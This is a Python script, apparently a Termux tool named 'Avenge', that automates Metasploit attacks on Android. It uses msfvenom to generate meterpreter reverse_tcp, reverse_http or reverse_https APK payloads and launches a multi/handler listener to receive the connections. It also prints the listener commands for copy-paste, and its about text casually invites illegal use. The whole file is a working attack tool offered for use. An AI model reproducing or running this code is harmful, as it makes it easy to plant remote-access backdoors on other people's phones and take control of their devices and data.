#!/usr/bin/python3.8


import os
import random
import time
import subprocess

rows,columns=os.popen('stty size', 'r').read().split()
Colms =  int ((int (columns)-16) / 2)
c = " " * Colms
cc = " " * (Colms-8)
hline = '-'*int(columns)
filename = 'userinput.txt'
# colors.
blue = "\033[1;34m"
cyan = "\033[1;36m"
red = "\033[1;31m"
colors = ["\033[1;33m","\033[1;37m",
"\033[1;31m","\033[1;34m", "\033[1;32m"]
fore = random.choice (colors)
fore1 = "\033[1;36m"
fore2 = "\033[1;35m"
p1 = "\033[1;31mA V E N G E/~   "+cyan
box= blue+'[ '+red+'#'+blue+' ]  '+cyan

def banner ():

    subprocess.call ('clear', shell=True)
    print ("\n")
    print (c+fore+"   o        o")
    print (c+fore+"     0 ■■ 0")
    print (c+fore+"     ■■■■■■")
    print (c+fore+"    ■■"+fore1+"▣"+fore+"■■"+fore1+"▣"+fore+"■■")
    print (c+fore+"   ■■■■■■■■■■")
    print (c+fore+"■■ ■■■■■■■■■■ ■■")
    print (c+fore+"■■ ■■■■■■■■■■ ■■")
    print (c+fore+"■■ ■■■■■■■■■■ ■■")
    print (c+fore+"   ■■■■■■■■■■")
    print (c+fore+"     ■■  ■■")
    print (c+fore+"     ■■  ■■")
    print (blue+hline)
    print (red+'(｡◕‿◕｡)➜'+cc+cyan+'  A V E N G E')
    print (blue+hline)

def Check_requirments ():

    vv = "/sdcard/Avenge"
    if os.path.exists (vv) == False:
        subprocess.call ("mkdir "+vv, shell =True)
    msf = '/data/data/com.termux/files/usr/bin/msfconsole'
    if os.path.exists (msf) == False :
        print ('\n')
        x = ["Checking Metasploit  ....",
            "Ooo No! Metasploit isn't in your System",
            "Install Metasploit Correctly.",
            "Then try again."]
        for i in x:
             print (box+'   '+i)
             time.sleep(3)
        print (" \n ")
        exit (0)
    y = "pg_ctl status -D $PREFIX/var/lib/postgresql"
    i = 'pg_ctl: no server running'
    if i == subprocess.getoutput (y):
        x = "pg_ctl -sD $PREFIX/var/lib/postgresql start"
        subprocess.call (x, shell=True)
        time.sleep (2)
        banner ()
    if 'userinput.txt' in os.listdir():
        with open ('userinput.txt', 'r') as k:
            l = k.readline()
        if l == None:
           subprocess.call ('rm userinput.txt', shell=True)

def in_put ():

    time.sleep(1.2)
    plist = ['android/meterpreter/reverse_tcp',
    'android/meterpreter/reverse_http',
    'android/meterpreter/reverse_https', 'Exit']
    print (cyan+"\nSelect Type of Android Payload\nDefault type is\n"+blue+plist[0]+'\n')
    for i in range (len(plist)):
        time.sleep(0.3)
        print (blue+'  [ '+cyan+str(i+1)+blue+' ]'+cyan+'  '+plist[i])
    print ('\n')
    y = ['1','2','3','4']
    spldt = str (input (p1))
    while spldt not in y and spldt != '':
        spldt = str (input (p1))
        print ('Please Type correct Number')
    if spldt== '':
        type = plist[0]
    elif int(spldt)<4:
        type = plist[int(spldt)-1]
    elif int(spldt)==4:
        exite ()
    print ('\n')
    ip = str (input(blue+"Enter   Local   IP: "+cyan))
    while ip=='':
        ip = str (input(blue+"Enter   Local   IP: "+cyan))
    port = str (input(blue+"Enter  Port number: "+cyan))
    while port == '':
        port = str (input(blue+"Enter  Port number: "+cyan))
    with open ('userinput.txt', 'w') as file:
        file.write(type+' '+ip+' '+port)

def create_payload (type, ip, port ,name, path='/sdcard/Avenge/'):

    print ('\n'+box+'Creating Your Payload\n'+box+'Keep Patience.....\n'+blue)
    x = "msfvenom -p "+type+' LHOST='+ip+' LPORT='+port+' -o '+path+name+' > /dev/null 2&>1'
    ou_t = subprocess.getoutput (x)
    return ou_t

def start_listener (type, ip, port):

    y = subprocess.getoutput ('ps -aux | grep \'msfconsole\' | head -n 1')
    if y.endswith('/msfconsole'):
        subprocess.call ('pkill ruby', shell=True)
    print ('\n'+box+'Starting Metasploit Listner\n'+box+'Keep Patience.....\n'+blue)
    x = "msfconsole -qx use\\ exploit/multi/handler -x set\\ payload\\ "+type+" -x set\\ lhost\\ "+ip+" -x set\\ lport\\ "+port+" -x exploit"
    subprocess.call (x, shell=True)
    main ()

def exite ():

    banner ()
    print ('\n\n\n'+blue+hline)
    print (cyan+"Good By   "+red+'  ┌(★ｏ☆)┘')
    print (blue+hline)
    exit (0)

def filer (filename):
    with open (filename, 'r') as data:
        y = data.readline()
        d_list = list(map(str,y.split()))
    return d_list

def byusing (d_typ, d_list):
    print ('\n'+box+'By Using these inputs....\n')
    for l in range(len(d_typ)):
        print (box+d_typ[l]+'  '+red+d_list[l])
        time.sleep(1)

def finaly (name):

    d_list = filer (filename)
    type = d_list[0]
    ip = d_list[1]
    port = d_list[2]
    k = create_payload (type, ip, port ,name, path='/sdcard/Avenge/')
    print('\n')
    if k.endswith('LPORT.') is True:
        lo = [red+'opps!!! Failed To Generate Payload',
        red+'Please Enter correct '+cyan+'Port Number',
        'Port: '+red+port+cyan+'is not Valid','Try again!']
        for i in lo:
            print (box+i)
            time.sleep (1.5)
        subprocess.call ('rm userinput.txt', shell=True)
        exit (0)
    if k.endswith('LHOST.') is True:
        lo = [red+'opps!!! Failed To Generate Payload',
        red+'Please Enter correct '+cyan+'IP Address',
        'IP: '+red+ip+cyan+'  is invalid!!','Try again!']
        for i in lo:
            print (box+i)
            time.sleep (1.5)
        subprocess.call ('rm userinput.txt', shell=True)
        exit (0)
    if os.path.exists('/sdcard/Avenge/'+name):
        p = ['Your Payload Has Created....',
        'Congratulations....',
        'It has Saved in' +red+' Internal Storage...',
        'In '+red+'Avenge'+cyan+' folder...',
        'With name '+red+name+'...']
        for i in p:
            time.sleep(2)
            print (box+i)
    opt = str(input(blue+'\nDo you want to Start Listener?\n[Defualt='+cyan+'Yes'+blue+']  ('+cyan+'Yes'+red+'/'+cyan+'No'+blue+') '+red))
    if opt.lower() in ['yes','y','ye','ys', '']:
        starting_listener ()
    else:
        print('\n'+box+'By Using these Commands You\n       can Start Metasploit Listener....\n')
        d_list = filer (filename)
        print ('\nmsfconsole')
        print ('use exploit/multi/handler')
        print ('set payload '+d_list[0])
        print ('set lhost '+d_list[1])
        print ('set lport '+d_list[2])
        print ('exploit')
        print ('\n\n'+box+'Copy-Paste these commands one by one')
        time.sleep (3)
        exit (0)

def creating_pld ():

    banner ()
    in_put ()
    name = str (input(blue+"Enter Payload name: "+cyan))
    if name == '':
        name = 'avenge.apk'
    if name.endswith (".apk") == False:
        name = name+".apk"
    with open ('userinput.txt', 'a') as f:
        f.write (' '+name)
    banner ()
    d_typ = ['Type:', 'IP:  ', 'Port:', 'Name:']
    d_list = filer (filename)
    byusing (d_typ, d_list)
    finaly (name)

def starting_listener ():

    banner ()
    files = os.listdir ()
    if 'userinput.txt' not in files:
        in_put ()
    d_list = filer(filename)
    if len (d_list) < 3:
       in_put ()
    d_typ = ['Type:', 'IP:  ', 'Port:']
    byusing (d_typ, d_list)
    type = d_list[0]
    ip = d_list[1]
    port = d_list[2]
    opt = str(input(blue+'\nDo you want to Start Listener?\n[Defualt='+cyan+'Yes'+blue+']  ('+cyan+'Yes'+red+'/'+cyan+'No'+blue+') '+red))
    if opt.lower() in ['yes','y','ye','ys', '']:
        banner ()
        byusing (d_typ, d_list)
        start_listener (type, ip, port)
    else:
        banner
        in_put()
        d_list = filer(filename)
        type = d_list[0]
        ip = d_list[1]
        port = d_list[2]
        d_typ = ['Type:', 'IP:  ', 'Port:']
        banner ()
        byusing (d_typ, d_list)
        start_listener (type, ip, port)

def about ():

    time.sleep(0.5)
    banner ()
    print (cyan+'\nSome Info about Me....\n')
    l = ['Creator:  ','YouTube:  ','Instagram:','GitHub:   ']
    p = ['Video:  ','Channel:','Insta:  ','GitHub: ']
    ll = ['Hamza Hassan','D4 Droid','d4_droid','D4Droid']
    pp = ['coming soon..',
          'https://youtube.com/c/Avenge-YT',
          'https://instagram.com/Avenge-YT',
          'https://github.com/Avengehacker']
    for i in range(len (l)):
        print (box+l[i]+'  '+red+ll[i])
        time.sleep(2)
    print ('\nThere following Links you can follow...\n')
    for i in range (len(p)):
        print (box+p[i]+red+' '+pp[i])
        time.sleep(2)
    print (cyan+'\n\n\n          This Tool is for beginners of termux as well as for masters. Anyone can use this for right purpose. Use it for elligal activity at your own risk. I\'m not responsible.')
    time.sleep(3)
    print (cyan+'\n\n          This will prevent you from entering long commands. It will save your time. It can create your payload and can set listner automatically. This is very very useful tool.\n\n')
    time.sleep(2)
    ch = [['Back','Exit'],['main ()','exit ()']]
    for i in range (len(ch[0])):
        print ('   [ '+str(int(i)+1)+' ]  '+ch[0][i])
    chi = str (input(p1))
    x = ['1','2']
    if chi in x:
        exec (ch[1][int(chi)-1])
    while chi not in x:
        chi = str (input(p1))

def chose ():

     opts = ['Create Android Payload', 'Start Metasploit Listener', 'About','Exit']
     cmd = ['creating_pld ()','starting_listener ()','about()','exite ()']
     time.sleep(1)
     print ("\n"+box+"Select option....\n")
     for i in range (len(opts)):
         time.sleep(0.3)
         print (blue+'  [ '+cyan+str(i+1)+blue+' ]  '+cyan+opts[i])
     print ('\n')
     soption = str(input (p1))
     s = ['1','2','3','4']
     while soption not in s:
         soption = str (input (p1))
     if soption in s:
         exec (cmd[int(soption)-1])

def main ():

    subprocess.call ("termux-setup-storage", shell=True)
    banner ()
    Check_requirments ()
    time.sleep (1.5)
    chose ()



if __name__ == "__main__":
    try:
        main ()
    except KeyboardInterrupt:
        exite ()
    except ValueError:
        print (box+'ops!!! Wrong entry. Try again!')
        time.sleep()
        exit (0)
    except EOFError:
        print (box+'unknown error!!!   Try again!')
        exite (0)
